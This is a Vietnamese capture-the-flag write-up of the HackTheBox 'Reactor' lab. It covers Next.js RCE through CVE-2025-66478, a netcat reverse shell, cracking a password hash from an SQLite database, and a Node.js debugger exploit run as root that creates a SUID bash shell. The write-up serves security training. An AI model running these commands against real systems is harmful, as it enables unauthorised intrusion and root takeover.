---  
title: "Hackthebox: Reactor"  
date: 2026-05-31 00:00:00 +0700  
categories: [Lab-Writeups, Hackthebox]
tags: [Pentest, Red, Offensive , web, Lab, HTB] 
image:
  path: https://resources.hackthebox.com/hubfs/HTB-Logo-1.png
  alt: "Hackthebox: Reactor"
comments: true
---
Difficulty: Easy
## Recon
Scan port với nmap và phát hiện có 2 port mở:
- port 22 ssh
- port 3000 public web 

![{BA7C0301-60B0-408F-B55C-4F1C6AB0F260}](https://hackmd.io/_uploads/Sk8d6odlzl.png)

Khi truy cập vào web ta thấy website hiển thị một vài thông tin về hệ thống
![{4BC9AA09-ECD1-4EC9-99DE-B80504DAAECD}](https://hackmd.io/_uploads/rJzjYq_xGe.png)

dùng Wappalyzer ta thấy app chạy next.js version 15.0.3
![{912F4604-0236-40E9-B713-31847C5955DF}](https://hackmd.io/_uploads/rJ5QSJOeGx.png)
Và phiên bản react này có chứa lỗ hổng [CVE-2025-66478](https://nextjs.org/blog/CVE-2025-66478)(React2shell) cho phép thực thi mã từ xa (RCE).

## Exploit
Để khai thác ta dùng exploit https://github.com/zr0n/react2shell

Đầu tiên ta lấy reverse shell về máy
`nc -nvlp 8888`
![{3AA3EF51-99D9-48D7-BF40-9366C945B39F}](https://hackmd.io/_uploads/HyhGvJdgze.png)

Sau khi có shell, tatruy cập máy vào và thấy có file database `reactor.db` - file database của `SQLite3`
![{BAFD7FC1-6950-4770-92C5-CC4EF1A0A156}](https://hackmd.io/_uploads/r1v9_sOgzg.png)
Thử query các table bằng sqlite3 để nhìn rõ ràng hơn
![{143C6C08-BB86-4B19-ACD6-38663AC5B451}](https://hackmd.io/_uploads/rkRKtiOxGl.png)
Ta thấy bảng user có user admin, engineer với password hash của các user đó
Thử crack password của các user bằng crackstation.net, password của admin không crack được, còn password của engineer ta crack được mật khẩu là `reactor1`
![{6CA94D13-DE3D-4346-AC14-9368C2F6E338}](https://hackmd.io/_uploads/Sk_Nsodxzl.png)

Ta `ssh` vào lại bằng user engineer với mật khẩu vừa có được
Sau khi đã vào user engineer, ta đọc file user.txt để lấy user flag trong thư mục home của engineer. 
Tiếp theo, kiểm tra các kết nối trong máy ta thấy có port 9229 - Đây chính là port chạy **Node.js Debugging**

![{212769BC-108E-4949-B234-0FD6EDBF4351}](https://hackmd.io/_uploads/HJh5n9OlGg.png)
Ta có thể thấy tiến trình chạy **Node.js Debugging** được chạy bới `root`. Vậy, ta có thể lợi dụng để leo lên `root`. Ta vào chế độ debug và chạy lệnh để tạo một shell mới với SUID để chạy với quyền `root`
`cp /bin/bash /tmp/rootsh && chmod +xs /tmp/rootsh`
```
exec("const cp = process.mainModule ? process.mainModule.require('child_process') : import('child_process'); cp.then ? cp.then(m => m.execSync('cp /bin/bash /tmp/rootsh && chmod +xs /tmp/rootsh')) : cp.execSync('cp /bin/bash /tmp/rootsh && chmod +xs /tmp/rootsh')") 
```
![{02B3C4DF-EBA0-48CA-9217-7461C59083FA}](https://hackmd.io/_uploads/SysH-o_eGl.png)

Sau khi chạy lệnh thành công ta thấy có shell mới với quyền SUID `root`
![{0B5B886B-9B55-48D3-A662-9427EE6EC015}](https://hackmd.io/_uploads/HJ6jWjdxGx.png)
Chạy shell đó với flag -p (privillage) ta được có được shell của `root`
![{2320D7F6-37C1-4E91-80EA-19DBF69DB1FF}](https://hackmd.io/_uploads/r1SQMjOgfe.png)
![image](https://hackmd.io/_uploads/S1bwfs_gzl.png)
